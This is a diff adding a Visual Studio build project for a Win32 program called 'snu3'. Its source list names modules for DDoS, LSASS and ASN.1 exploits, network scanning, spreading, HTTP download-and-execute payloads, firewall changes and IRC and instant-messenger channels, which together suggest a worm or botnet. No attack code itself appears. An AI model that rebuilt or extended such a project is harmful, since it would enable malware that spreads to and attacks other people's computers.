@@ -1,0 +1,235 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{0162CF2A-890D-4A8C-BDB7-F84D16BD4098}</ProjectGuid>
+    <RootNamespace>snu3</RootNamespace>
+    <Keyword>Win32Proj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <PlatformToolset>v141</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <PlatformToolset>v141</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup>
+    <_ProjectFileVersion>15.0.27130.2010</_ProjectFileVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <OutDir>Debug\</OutDir>
+    <IntDir>Debug\</IntDir>
+    <LinkIncremental>true</LinkIncremental>
+    <IncludePath>$(DXSDK_DIR)Include;$(IncludePath)</IncludePath>
+    <LibraryPath>$(DXSDK_DIR)Lib\x86;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <OutDir>Release\</OutDir>
+    <IntDir>Release\</IntDir>
+    <LinkIncremental>false</LinkIncremental>
+    <IncludePath>$(DXSDK_DIR)Include;$(IncludePath)</IncludePath>
+    <LibraryPath>$(DXSDK_DIR)Lib\x86;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <Optimization>Disabled</Optimization>
+      <AdditionalIncludeDirectories>C:\Program Files\Microsoft Platform SDK\Include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_CLIENT;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <MinimalRebuild>true</MinimalRebuild>
+      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <PrecompiledHeader />
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>comctl32.lib;Comdlg32.lib;Advapi32.lib;Msimg32.lib;Ws2_32.lib;d3d9.lib;d3dx9.lib;msgrguid.lib;comsupp.lib;comsuppw.lib;Iphlpapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>$(OutDir)snu3.exe</OutputFile>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)snu3.pdb</ProgramDatabaseFile>
+      <SubSystem>Windows</SubSystem>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <Optimization>Disabled</Optimization>
+      <AdditionalIncludeDirectories>C:\Program Files\Microsoft Platform SDK\Include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_CLIENT;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <StringPooling>true</StringPooling>
+      <MinimalRebuild>true</MinimalRebuild>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PrecompiledHeader />
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <CallingConvention>Cdecl</CallingConvention>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>comctl32.lib;Comdlg32.lib;Advapi32.lib;Msimg32.lib;Ws2_32.lib;d3d9.lib;d3dx9.lib;msgrguid.lib;comsupp.lib;comsuppw.lib;Iphlpapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>$(OutDir)snu3.exe</OutputFile>
+      <SuppressStartupBanner>false</SuppressStartupBanner>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <OptimizeReferences>true</OptimizeReferences>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="aes\aescrypt.c" />
+    <ClCompile Include="aes\aeskey.c" />
+    <ClCompile Include="aes\aestab.c" />
+    <ClCompile Include="aim.cpp" />
+    <ClCompile Include="childimage.cpp" />
+    <ClCompile Include="clipboard.cpp" />
+    <ClCompile Include="config.cpp" />
+    <ClCompile Include="connections.cpp" />
+    <ClCompile Include="crypt.cpp" />
+    <ClCompile Include="ddos.cpp" />
+    <ClCompile Include="debug.cpp" />
+    <ClCompile Include="display.cpp" />
+    <ClCompile Include="dns.cpp" />
+    <ClCompile Include="executemessage.cpp" />
+    <ClCompile Include="exploit_asn.cpp" />
+    <ClCompile Include="exploit_lsass.cpp" />
+    <ClCompile Include="file.cpp" />
+    <ClCompile Include="filescan.cpp" />
+    <ClCompile Include="firewall.cpp" />
+    <ClCompile Include="ftp.cpp" />
+    <ClCompile Include="hostexempt.cpp" />
+    <ClCompile Include="http.cpp" />
+    <ClCompile Include="idletrack.cpp" />
+    <ClCompile Include="irc.cpp" />
+    <ClCompile Include="link.cpp" />
+    <ClCompile Include="linkcache.cpp" />
+    <ClCompile Include="listlinks.cpp" />
+    <ClCompile Include="logdialog.cpp" />
+    <ClCompile Include="messagedialog.cpp" />
+    <ClCompile Include="messagedialogs.cpp" />
+    <ClCompile Include="msm.cpp" />
+    <ClCompile Include="mutex.cpp" />
+    <ClCompile Include="p2p2.cpp" />
+    <ClCompile Include="payload_httpexec.cpp" />
+    <ClCompile Include="pe.cpp" />
+    <ClCompile Include="preferences.cpp" />
+    <ClCompile Include="proxy.cpp" />
+    <ClCompile Include="rand.cpp" />
+    <ClCompile Include="registry.cpp" />
+    <ClCompile Include="rsa\digit.c" />
+    <ClCompile Include="rsa\md5c.c" />
+    <ClCompile Include="rsa\nn.c" />
+    <ClCompile Include="rsa\prime.c" />
+    <ClCompile Include="rsa\rsa.c" />
+    <ClCompile Include="rsa\r_keygen.c" />
+    <ClCompile Include="rsa\r_random.c" />
+    <ClCompile Include="scan.cpp" />
+    <ClCompile Include="sel.cpp" />
+    <ClCompile Include="sendupdate.cpp" />
+    <ClCompile Include="smtp.cpp" />
+    <ClCompile Include="snu3.cpp" />
+    <ClCompile Include="socketwrapper.cpp" />
+    <ClCompile Include="spread.cpp" />
+    <ClCompile Include="sysinfo.cpp" />
+    <ClCompile Include="target.cpp" />
+    <ClCompile Include="tcptunnel.cpp" />
+    <ClCompile Include="thread.cpp" />
+    <ClCompile Include="timeout.cpp" />
+    <ClCompile Include="transferlog.cpp" />
+    <ClCompile Include="triton.cpp" />
+    <ClCompile Include="update.cpp" />
+    <ClCompile Include="wildcard.cpp" />
+    <ClCompile Include="yahoo.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aes\aes.h" />
+    <ClInclude Include="aes\aesopt.h" />
+    <ClInclude Include="aim.h" />
+    <ClInclude Include="clipboard.h" />
+    <ClInclude Include="config.h" />
+    <ClInclude Include="connections.h" />
+    <ClInclude Include="crypt.h" />
+    <ClInclude Include="debug.h" />
+    <ClInclude Include="display.h" />
+    <ClInclude Include="exploit_asn.h" />
+    <ClInclude Include="exploit_lsass.h" />
+    <ClInclude Include="file.h" />
+    <ClInclude Include="firewall.h" />
+    <ClInclude Include="hostexempt.h" />
+    <ClInclude Include="http.h" />
+    <ClInclude Include="idletrack.h" />
+    <ClInclude Include="irc.h" />
+    <ClInclude Include="link.h" />
+    <ClInclude Include="linkcache.h" />
+    <ClInclude Include="listlinks.h" />
+    <ClInclude Include="logdialog.h" />
+    <ClInclude Include="messagedialog.h" />
+    <ClInclude Include="messagedialogs.h" />
+    <ClInclude Include="msgrua.h" />
+    <ClInclude Include="msgruaid.h" />
+    <ClInclude Include="msm.h" />
+    <ClInclude Include="mutex.h" />
+    <ClInclude Include="p2p2.h" />
+    <ClInclude Include="payload_httpexec.h" />
+    <ClInclude Include="preferences.h" />
+    <ClInclude Include="proxy.h" />
+    <ClInclude Include="rand.h" />
+    <ClInclude Include="registry.h" />
+    <ClInclude Include="resource.h" />
+    <ClInclude Include="rsa\rsa.h" />
+    <ClInclude Include="rsa\rsaref.h" />
+    <ClInclude Include="scan.h" />
+    <ClInclude Include="sel.h" />
+    <ClInclude Include="sendupdate.h" />
+    <ClInclude Include="socketwrapper.h" />
+    <ClInclude Include="target.h" />
+    <ClInclude Include="tcptunnel.h" />
+    <ClInclude Include="thread.h" />
+    <ClInclude Include="timeout.h" />
+    <ClInclude Include="transferlog.h" />
+    <ClInclude Include="triton.h" />
+    <ClInclude Include="update.h" />
+    <ClInclude Include="wildcard.h" />
+    <ClInclude Include="yahoo.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="snu3.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="snu3.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <Text Include="changelog.txt" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+  <ProjectExtensions>
+    <VisualStudio>
+      <UserProperties RESOURCE_FILE="snu3.rc" />
+    </VisualStudio>
+  </ProjectExtensions>
+</Project>
